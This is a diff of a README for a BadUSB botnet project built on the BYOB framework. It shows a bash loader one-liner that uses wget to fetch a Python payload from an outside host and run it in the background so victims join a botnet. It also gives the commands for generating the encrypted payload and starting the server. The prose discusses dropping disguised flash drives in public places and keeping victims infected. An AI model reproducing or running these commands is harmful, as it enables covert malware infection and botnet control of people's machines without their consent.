@@ -94,7 +94,7 @@ cd /opt/byob/byob && python server.py --port 1337
 
 ### Payloads  
 
-#### Loader
+#### Loader  
 Our BadUSB attack downloads and executes the loader script. For our attack on Linux machines this is a bash script called `linux_loader`, which can be found below.
 
 ```bash
@@ -104,7 +104,7 @@ nohup wget https://sheep.casa/payloads/linux_payload.py -P /tmp && python /tmp/l
 
 The loader script downloads our python payload and executes it to join our botnet. This script is run in the background so that the terminal window is not present while the botnet client (payload) is running.
 
-#### Python Payload
+#### Python Payload  
 
 A payload is generated via BYOB's `client.py` script. We've generated our Linux payload by issuing `python client.py --name linux_payload --encrypt --compress --freeze sheep.casa 1337`.
 
@@ -142,6 +142,3 @@ We've yet to configure our BadUSB devices to infect Windows or OSX machines. Add
 Ideally, the same BadUSB device would be able to infect Windows, OSX, and Linux. However, we're still uncertain that this is technically achievable given the way USB functions. Currently we do not have knowledge of how to detect which operating system a victim's computer is running. We may need to configure different devices to be plugged in depending on the victim's machine. However, we will still explore how one device may be used to infect all OS(s). An option we're exploring is simply loading all of our payloads onto one device, and attempting to execute each of them quietly until the machine is infected.
 
 A different device per OS would be perfectly acceptable in an attack scenario in which the attacker has physical access to the victim's machine. The devices are cheap and small, so carrying three of them should be no issue. However, for attack scenarios in which the BadUSB device is left in a public place for a victim to find (disguised as a lost flash drive), the ability to infect any OS would greatly improve the success rate.
-
-Lastly, once a victim is initially infected, we'd like to keep them infected. This means we're exploring how to add our payloads to run on startup, but without root/admin privileges this may not be feasible. 
-
